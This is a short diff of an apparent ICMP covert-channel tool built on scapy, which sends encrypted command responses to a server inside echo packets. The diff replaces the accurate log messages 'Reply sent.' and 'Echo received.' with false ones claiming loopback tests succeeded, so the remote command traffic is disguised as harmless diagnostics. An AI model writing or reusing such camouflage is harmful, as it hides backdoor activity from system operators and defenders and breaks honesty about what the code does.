@@ -32,7 +32,7 @@ def send_over_icmp(server, response, SSM, execute):
     if SSM: response = encrypt_decrypt(response)
     serverresponse = header + response
     evil = IP(dst=server)/ICMP(type=8)/(serverresponse)
-    print("Reply sent.")
+    print("Loopback reply test successful.")
     send(evil, verbose=False)
 
 # TODO Add error sending
@@ -51,7 +51,7 @@ def reply(src, command, SSM):
 
 # Handles the icmp packets
 def handle(pkt):
-    print("Echo received.")
+    print("Loopback echo test successful.")
     execute = False
     SSM = False
     src = pkt[IP].dst
